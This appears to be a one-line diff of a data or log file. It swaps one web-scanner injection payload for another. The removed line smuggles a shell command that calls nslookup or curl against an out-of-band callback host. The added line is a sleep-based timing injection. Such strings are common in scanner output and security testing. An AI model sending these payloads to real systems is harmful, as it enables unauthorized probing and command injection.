@@ -1,1 +1,1 @@
-&(nslookup${IFS}-q${IFS}cname${IFS}hitmwossrwdlc6a706.bxss.me||curl${IFS}hitmwossrwdlc6a706.bxss.me)&'\"`0&(nslookup${IFS}-q${IFS}cname${IFS}hitmwossrwdlc6a706.bxss.me||curl${IFS}hitmwossrwdlc6a706.bxss.me)&`'
+555"||sleep(27*1000)*ccrzzc||"
